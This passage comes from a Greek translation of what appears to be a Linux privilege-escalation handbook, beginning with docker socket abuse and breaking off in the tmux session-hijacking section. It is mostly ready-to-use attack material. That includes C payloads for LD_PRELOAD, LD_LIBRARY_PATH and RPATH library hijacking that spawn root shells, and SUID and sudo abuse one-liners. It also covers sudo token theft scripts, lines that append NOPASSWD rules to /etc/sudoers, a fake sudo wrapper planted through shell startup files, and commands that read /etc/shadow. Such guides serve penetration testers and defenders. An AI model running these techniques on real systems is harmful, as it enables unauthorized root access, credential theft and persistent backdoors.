3.  **Attach to the Container:** Χρησιμοποιήστε το `socat` για να δημιουργήσετε μια σύνδεση με το container, επιτρέποντας την εκτέλεση εντολών εντός αυτού.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Αφού ρυθμίσετε τη σύνδεση `socat`, μπορείτε να εκτελείτε εντολές απευθείας στο container με πρόσβαση επιπέδου root στο filesystem του host.

### Others

Σημειώστε ότι αν έχετε δικαιώματα εγγραφής στο docker socket επειδή είστε **inside the group `docker`** έχετε [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Αν ο [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`ctr`**, διαβάστε την ακόλουθη σελίδα καθώς **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`runc`** διαβάστε την παρακάτω σελίδα καθώς **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

Το D-Bus είναι ένα προηγμένο **inter-Process Communication (IPC) system** που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να μοιράζονται δεδομένα αποδοτικά. Σχεδιασμένο με γνώμονα το σύγχρονο σύστημα Linux, προσφέρει ένα στιβαρό πλαίσιο για διαφορετικές μορφές επικοινωνίας εφαρμογών.

Το σύστημα είναι ευέλικτο, υποστηρίζοντας βασικό IPC που ενισχύει την ανταλλαγή δεδομένων μεταξύ διεργασιών, παρομοιάζοντας **enhanced UNIX domain sockets**. Επιπλέον, βοηθά στην εκπομπή γεγονότων ή σημάτων, διευκολύνοντας την απρόσκοπτη ενσωμάτωση μεταξύ των συστατικών του συστήματος. Για παράδειγμα, ένα σήμα από ένα Bluetooth daemon για εισερχόμενη κλήση μπορεί να προκαλέσει έναν music player να μπει σε σίγαση, βελτιώνοντας την εμπειρία χρήστη. Επιπλέον, το D-Bus υποστηρίζει ένα remote object system, απλοποιώντας αιτήματα υπηρεσιών και κλήσεις μεθόδων μεταξύ εφαρμογών, απλοποιώντας διαδικασίες που παραδοσιακά ήταν περίπλοκες.

Το D-Bus λειτουργεί με ένα **allow/deny model**, διαχειριζόμενο τα δικαιώματα μηνυμάτων (κλήσεις μεθόδων, εκπομπές σημάτων, κ.λπ.) με βάση το σωρευτικό αποτέλεσμα των κανόνων πολιτικής που ταιριάζουν. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το bus και ενδέχεται να επιτρέψουν privilege escalation μέσω της εκμετάλλευσης αυτών των δικαιωμάτων.

Παρατίθεται ένα παράδειγμα τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, που περιγράφει δικαιώματα για τον χρήστη root να κατέχει, να στέλνει και να λαμβάνει μηνύματα από το `fi.w1.wpa_supplicant1`.

Οι πολιτικές χωρίς καθορισμένο user ή group εφαρμόζονται καθολικά, ενώ οι πολιτικές context "default" εφαρμόζονται σε όλους όσους δεν καλύπτονται από άλλες συγκεκριμένες πολιτικές.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθε πώς να enumerate και να exploit μια D-Bus επικοινωνία εδώ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να enumerate το δίκτυο και να προσδιορίσουμε τη θέση της μηχανής.

### Γενική enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Ελέγξτε πάντα τις υπηρεσίες δικτύου που τρέχουν στη μηχανή και με τις οποίες δεν καταφέρατε να αλληλεπιδράσετε πριν την πρόσβασή σας:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Ελέγξτε αν μπορείτε να sniff traffic. Αν μπορείτε, ίσως να μπορέσετε να αποκτήσετε κάποια credentials.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Ελέγξτε **who** είστε, ποια **privileges** έχετε, ποιοι **users** υπάρχουν στα συστήματα, ποιοι μπορούν να **login** και ποιοι έχουν **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Μεγάλο UID

Κάποιες εκδόσεις του Linux επηρεάστηκαν από ένα bug που επιτρέπει σε χρήστες με **UID > INT_MAX** να αποκτήσουν αυξημένα προνόμια. Περισσότερες πληροφορίες: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Εκμεταλλευτείτε το** χρησιμοποιώντας: **`systemd-run -t /bin/bash`**

### Ομάδες

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας παραχωρήσει δικαιώματα root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Πρόχειρο

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον στο πρόχειρο (αν είναι δυνατόν)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική Κωδικών Πρόσβασης
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

Αν **γνωρίζεις κάποιον κωδικό πρόσβασης** του περιβάλλοντος **προσπάθησε να συνδεθείς ως κάθε χρήστης** χρησιμοποιώντας τον.

### Su Brute

Αν δεν σε πειράζει να κάνεις πολύ θόρυβο και τα δυαδικά `su` και `timeout` είναι παρόντα στον υπολογιστή, μπορείς να δοκιμάσεις να κάνεις brute-force έναν χρήστη χρησιμοποιώντας [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` προσπαθεί επίσης να κάνει brute-force σε χρήστες.

## Καταχρήσεις writable PATH

### $PATH

Αν διαπιστώσεις ότι μπορείς να **γράψεις μέσα σε κάποιον φάκελο του $PATH** μπορεί να καταφέρεις να ανεβάσεις δικαιώματα δημιουργώντας **μια backdoor μέσα στον εγγράψιμο φάκελο** με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (κατά προτίμηση root) και η οποία **δεν φορτώνεται από φάκελο που βρίσκεται πριν** από τον εγγράψιμο φάκελό σου στο $PATH.

### SUDO and SUID

Μπορεί να σου επιτρέπεται να εκτελέσεις κάποια εντολή χρησιμοποιώντας sudo ή να έχουν το suid bit. Έλεγξέ το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Ορισμένες **μη αναμενόμενες εντολές σας επιτρέπουν να διαβάσετε και/ή να γράψετε αρχεία ή ακόμη και να εκτελέσετε μια εντολή.** Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η ρύθμιση του Sudo μπορεί να επιτρέψει σε έναν χρήστη να εκτελέσει κάποια εντολή με τα προνόμια άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα ο χρήστης `demo` μπορεί να εκτελέσει το `vim` ως `root`. Είναι πλέον απλό να αποκτηθεί ένα shell προσθέτοντας ένα ssh key στον κατάλογο root ή καλώντας `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** ενώ εκτελεί κάτι:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **βασισμένο στο HTB machine Admirer**, ήταν **ευάλωτο** σε **PYTHONPATH hijacking** για να φορτώσει μια αυθαίρετη python library κατά την εκτέλεση του script ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo — παράκαμψη μονοπατιών εκτέλεσης

**Μετάβαση** για να διαβάσετε άλλα αρχεία ή χρησιμοποιήστε **symlinks**. Για παράδειγμα στο sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Αν χρησιμοποιηθεί **wildcard** (\*), είναι ακόμα πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Μέτρα αντιμετώπισης**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Εντολή sudo/SUID binary χωρίς καθορισμένη διαδρομή εντολής

Αν έχει δοθεί η **sudo permission** σε μία μόνο εντολή **χωρίς να καθοριστεί η διαδρομή**: _hacker10 ALL= (root) less_ μπορείτε να την εκμεταλλευτείτε αλλάζοντας τη μεταβλητή PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** binary **εκτελεί άλλη εντολή χωρίς να καθορίζει τη διαδρομή προς αυτήν (πάντα ελέγξτε με** _**strings**_ **το περιεχόμενο ενός περίεργου SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary με καθορισμένη διαδρομή εντολής

Αν το **suid** binary **εκτελεί άλλη εντολή καθορίζοντας τη διαδρομή**, τότε μπορείτε να δοκιμάσετε να **export a function** με όνομα την εντολή που καλεί το αρχείο suid.

Για παράδειγμα, αν ένα suid binary καλεί _**/usr/sbin/service apache2 start**_ πρέπει να προσπαθήσετε να δημιουργήσετε τη συνάρτηση και να την export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Τότε, όταν καλέσετε το suid εκτελέσιμο, αυτή η συνάρτηση θα εκτελεστεί

### LD_PRELOAD & **LD_LIBRARY_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να καθορίσει μία ή περισσότερες shared libraries (.so files) που θα φορτωθούν από τον loader πριν από όλες τις άλλες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως preloading a library.

Ωστόσο, για τη διατήρηση της ασφάλειας του συστήματος και την αποφυγή εκμετάλλευσης αυτής της δυνατότητας, ιδιαίτερα σε **suid/sgid** εκτελέσιμα, το σύστημα επιβάλλει ορισμένες συνθήκες:

- Ο loader αγνοεί την **LD_PRELOAD** για εκτελέσιμα όπου το real user ID (_ruid_) δεν ταιριάζει με το effective user ID (_euid_).
- Για εκτελέσιμα με suid/sgid, μόνο βιβλιοθήκες σε standard paths που είναι επίσης suid/sgid προφορτώνονται.

Privilege escalation μπορεί να συμβεί αν έχετε τη δυνατότητα να εκτελείτε εντολές με `sudo` και η έξοδος του `sudo -l` περιλαμβάνει την δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να επιμένει και να αναγνωρίζεται ακόμη και όταν οι εντολές εκτελούνται με `sudo`, ενδεχομένως οδηγώντας στην εκτέλεση αυθαίρετου κώδικα με αυξημένα προνόμια.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθηκεύστε ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Στη συνέχεια **compile it** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τέλος, **escalate privileges** τρέχοντας
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ένα παρόμοιο privesc μπορεί να εκμεταλλευτεί εάν ο attacker ελέγχει την **LD_LIBRARY_PATH** env variable, επειδή ελέγχει τη διαδρομή όπου θα αναζητηθούν οι βιβλιοθήκες.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Όταν συναντάτε ένα binary με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να ελέγξετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την παρακάτω εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η εμφάνιση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει πιθανότητα εκμετάλλευσης.

Για να το εκμεταλλευτεί κανείς, θα προχωρούσε δημιουργώντας ένα C αρχείο, π.χ. _"/path/to/.config/libcalc.c"_, που περιέχει τον παρακάτω κώδικα:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, μόλις μεταγλωττιστεί και εκτελεστεί, στοχεύει στην αύξηση των privileges μέσω της τροποποίησης των file permissions και της εκτέλεσης ενός shell με elevated privileges.

Μεταγλωττίστε το παραπάνω αρχείο C σε shared object (.so) με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τέλος, η εκτέλεση του επηρεασμένου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας πιθανή παραβίαση του συστήματος.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που έχουμε βρει ένα SUID binary που φορτώνει μια βιβλιοθήκη από έναν φάκελο όπου μπορούμε να γράψουμε, ας δημιουργήσουμε τη βιβλιοθήκη σε εκείνον τον φάκελο με το απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Αν λάβετε ένα σφάλμα όπως:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
αυτό σημαίνει ότι η βιβλιοθήκη που έχετε δημιουργήσει πρέπει να έχει μια συνάρτηση με όνομα `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα Unix binaries που μπορούν να εκμεταλλευτούν επιτιθέμενοι για να παρακάμψουν τοπικούς περιορισμούς ασφαλείας. [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο αλλά για περιπτώσεις όπου μπορείτε **μόνο να εισάγετε ορίσματα** σε μια εντολή.

Το έργο συγκεντρώνει νόμιμες λειτουργίες των Unix binaries που μπορούν να καταχραστούν για να διαφύγουν από restricted shells, να escalate ή να διατηρήσουν elevated privileges, να μεταφέρουν αρχεία, να spawn bind και reverse shells, και να διευκολύνουν άλλες εργασίες post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Επαναχρησιμοποίηση Sudo Tokens

Σε περιπτώσεις όπου έχετε **sudo access** αλλά όχι τον κωδικό, μπορείτε να κλιμακώσετε προνόμια περιμένοντας την εκτέλεση μιας εντολής sudo και στη συνέχεια αρπάζοντας το session token.

Απαιτήσεις για την κλιμάκωση προνομίων:

- Έχετε ήδη ένα shell ως χρήστης "_sampleuser_"
- "_sampleuser_" έχει **χρησιμοποιήσει `sudo`** για να εκτελέσει κάτι στα **τελευταία 15 λεπτά** (από προεπιλογή αυτή είναι η διάρκεια του sudo token που μας επιτρέπει να χρησιμοποιούμε `sudo` χωρίς να εισάγουμε κωδικό)
- `cat /proc/sys/kernel/yama/ptrace_scope` είναι 0
- `gdb` είναι προσβάσιμο (μπορείτε να το ανεβάσετε)

(Μπορείτε προσωρινά να ενεργοποιήσετε `ptrace_scope` με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή μόνιμα τροποποιώντας `/etc/sysctl.d/10-ptrace.conf` και ορίζοντας `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ **που ανήκει στον root και έχει setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Το **τρίτο exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα sudoers file** που **κάνει τα sudo tokens αιώνια και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Αν έχετε **write permissions** στο φάκελο ή σε οποιοδήποτε από τα αρχεία που δημιουργούνται μέσα σε αυτόν, μπορείτε να χρησιμοποιήσετε το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **create a sudo token for a user and PID**.\

Για παράδειγμα, εάν μπορείτε να overwrite το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα shell ως that user με PID 1234, μπορείτε να **obtain sudo privileges** χωρίς να χρειάζεται να γνωρίζετε το password κάνοντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` ρυθμίζουν ποιος μπορεί να χρησιμοποιεί το `sudo` και πώς. Αυτά τα αρχεία **από προεπιλογή μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Εάν** μπορείτε να **διαβάσετε** αυτό το αρχείο μπορεί να είστε σε θέση να **αποκτήσετε ορισμένες ενδιαφέρουσες πληροφορίες**, και αν μπορείτε να **γράψετε** οποιοδήποτε αρχείο θα μπορέσετε να **αποκτήσετε αυξημένα προνόμια**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Αν μπορείτε να γράψετε, μπορείτε να καταχραστείτε αυτή την άδεια
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ένας άλλος τρόπος κατάχρησης αυτών των δικαιωμάτων:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν μερικές εναλλακτικές στο δυαδικό `sudo`, όπως το `doas` για OpenBSD — θυμηθείτε να ελέγξετε τη ρύθμισή του στο `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

If you know that a **χρήστης συνήθως συνδέεται σε μια μηχανή και χρησιμοποιεί `sudo`** για να αυξήσει δικαιώματα και έχετε αποκτήσει ένα shell μέσα σε αυτό το περιβάλλον χρήστη, μπορείτε να **δημιουργήσετε ένα νέο sudo executable** που θα εκτελεί τον κώδικά σας ως root και μετά την εντολή του χρήστη. Έπειτα, **τροποποιήστε το $PATH** του περιβάλλοντος χρήστη (για παράδειγμα προσθέτοντας το νέο path στο .bash_profile) ώστε όταν ο χρήστης εκτελεί sudo, να εκτελείται το sudo executable σας.

Σημειώστε ότι αν ο χρήστης χρησιμοποιεί διαφορετικό shell (όχι bash) θα χρειαστεί να τροποποιήσετε άλλα αρχεία για να προσθέσετε το νέο path. Για παράδειγμα [sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείτε να βρείτε άλλο παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή τρέχοντας κάτι σαν:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Κοινή Βιβλιοθήκη

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα φορτωμένα αρχεία ρυθμίσεων**. Συνήθως, αυτό το αρχείο περιέχει την εξής γραμμή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι τα αρχεία ρυθμίσεων από `/etc/ld.so.conf.d/*.conf` θα διαβαστούν. Αυτά τα αρχεία ρυθμίσεων **δείχνουν σε άλλους φακέλους** όπου **οι βιβλιοθήκες** θα **αναζητηθούν**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στο `/usr/local/lib`**.

Εάν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις ενδεικνυόμενες διαδρομές: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο που αναφέρεται σε κάποιο αρχείο ρυθμίσεων στο `/etc/ld.so.conf.d/*.conf` μπορεί να καταφέρει να αποκτήσει αυξημένα προνόμια.\
Δείτε **πώς να εκμεταλλευτείτε αυτή την εσφαλμένη ρύθμιση** στην παρακάτω σελίδα:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Αν αντιγράψετε τη lib στο `/var/tmp/flag15/`, θα χρησιμοποιηθεί από το πρόγραμμα σε αυτή τη θέση όπως ορίζεται στη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Στη συνέχεια, δημιούργησε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Δυνατότητες

Οι Linux capabilities παρέχουν ένα **υποσύνολο των διαθέσιμων προνομίων root σε μια διεργασία**. Αυτό στην πράξη διασπά τα root **προνόμια σε μικρότερες και διακριτές μονάδες**. Κάθε μία από αυτές τις μονάδες μπορεί στη συνέχεια να χορηγηθεί ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο το πλήρες σύνολο προνομίων μειώνεται, μειώνοντας τους κινδύνους εκμετάλλευσης.\
Διαβάστε την παρακάτω σελίδα για να **μάθετε περισσότερα για τις capabilities και πώς να τις καταχραστείτε**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Δικαιώματα καταλόγου

Σε έναν κατάλογο, το **bit για το "execute"** υποδηλώνει ότι ο επηρεαζόμενος χρήστης μπορεί να κάνει "**cd**" στον φάκελο.\
Το **bit "read"** υποδηλώνει ότι ο χρήστης μπορεί να **εμφανίσει τη λίστα** των **αρχείων**, και το **bit "write"** υποδηλώνει ότι ο χρήστης μπορεί να **διαγράψει** και να **δημιουργήσει** νέα **αρχεία**.

## ACLs

Οι Access Control Lists (ACLs) αποτελούν το δευτερεύον επίπεδο διακριτικών δικαιωμάτων, ικανό να **παρακάμπτει τα παραδοσιακά ugo/rwx δικαιώματα**. Αυτά τα δικαιώματα βελτιώνουν τον έλεγχο πρόσβασης σε αρχεία ή καταλόγους επιτρέποντας ή αρνούμενα δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι ιδιοκτήτες ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομέρειας εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [**εδώ**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Δώστε** στον χρήστη "kali" δικαιώματα ανάγνωσης και εγγραφής σε ένα αρχείο:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Λήψη** αρχείων με συγκεκριμένα ACLs από το σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Ανοιχτές shell συνεδρίες

Σε **παλαιότερες εκδόσεις** μπορεί να **hijack** κάποια **shell** session διαφορετικού χρήστη (**root**).\
Στις **νεότερες εκδόσεις** θα μπορείτε να **connect** σε screen sessions μόνο του **δικού σας χρήστη**. Ωστόσο, μπορεί να βρείτε **interesting information inside the session**.

### screen sessions hijacking

**Λίστα screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Συνδέσου σε μια συνεδρία**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Αυτό ήταν ένα πρόβλημα με τις **παλιές εκδόσεις tmux**. Δεν μπόρεσα να hijack μια συνεδρία tmux (v2.1) που είχε δημιουργηθεί από root ως μη προνομιούχος χρήστης.

**Λίστα συνεδριών tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Συνδέσου σε μια συνεδρία**
```bash
